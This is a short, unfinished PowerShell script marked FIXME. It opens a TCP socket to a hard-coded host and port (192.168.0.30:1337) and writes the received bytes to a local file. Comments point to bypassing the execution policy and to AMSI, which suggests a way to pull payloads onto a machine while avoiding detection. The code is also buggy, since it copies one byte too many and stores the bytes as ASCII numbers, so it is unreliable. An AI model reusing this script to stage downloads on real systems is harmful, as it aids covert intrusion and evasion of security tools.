#FIXME
#powershell -NoP -NonI -Exec Bypass -Command
cd "C:\container"
$ip = '192.168.0.30'
$port = 1337
$client = New-Object System.Net.Sockets.TCPClient($ip, $port); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
$outFile = "o" 
New-Item -Path . -Name $outFile -ItemType "file" 
while(($len = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{ 
    # $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$len);
    # output a file of ascii numbers: xxd $outFile: 610d 0a0a 0d0a 620d 0a0a 0d0a    a.....b.....
    $data = $bytes[0..$len]
    Add-Content $outFile -Value $data -Encoding 'ascii' 
    #! amsi # bytes = [System.IO.File]::WriteAllBytes("o", $data)
}; 
$client.Close();